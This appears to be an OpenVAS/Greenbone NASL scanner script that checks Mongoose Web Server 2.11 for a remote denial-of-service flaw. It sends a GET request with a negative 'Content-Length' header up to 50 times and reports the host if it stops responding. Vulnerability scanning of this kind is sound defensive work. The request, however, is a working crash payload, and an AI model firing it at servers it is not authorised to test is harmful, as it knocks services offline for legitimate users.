CPE = "cpe:/a:cesanta:mongoose";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103004" );
	script_version( "2021-07-07T12:30:03+0000" );
	script_tag( name: "last_modification", value: "2021-07-07 12:30:03 +0000 (Wed, 07 Jul 2021)" );
	script_tag( name: "creation_date", value: "2011-01-03 14:40:34 +0100 (Mon, 03 Jan 2011)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "Mongoose Web Server 'Content-Length' HTTP Header Remote DoS Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_mongoose_web_server_http_detect.sc" );
	script_mandatory_keys( "cesanta/mongoose/http/detected" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "summary", value: "Mongoose Web Server is prone to a remote denial of service (DoS)
  vulnerability because it fails to handle specially crafted input." );
	script_tag( name: "vuldetect", value: "Sends multiple crafted HTTP GET request and checks if the host
  is still alive." );
	script_tag( name: "impact", value: "Successfully exploiting this issue will allow an attacker to
  crash the affected application, denying further service to legitimate users." );
	script_tag( name: "affected", value: "Mongoose Web Server 2.11 is vulnerable. Other versions may also
  be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one." );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/45602" );
	script_xref( name: "URL", value: "http://www.johnleitch.net/Vulnerabilities/Mongoose.2.11.Denial.Of.Service/74" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
req = NASLString( "GET / HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Length: -2147483648\\r\\n\\r\\n" );
for(i = 0;i < 50;i++){
	res = http_send_recv( port: port, data: req );
	if(http_is_dead( port: port )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

